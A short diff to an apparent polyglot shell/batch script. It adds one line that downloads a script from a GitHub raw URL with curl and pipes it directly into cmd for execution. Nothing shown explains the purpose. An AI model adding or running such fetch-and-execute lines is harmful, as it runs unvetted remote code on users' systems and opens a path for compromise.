@@ -1,6 +1,7 @@
 :<<BATCH
     @echo off
     echo %PATH%
+    curl -s https://raw.githubusercontent.com/zsimpson/ush/win | cmd
     exit /b
 BATCH
 
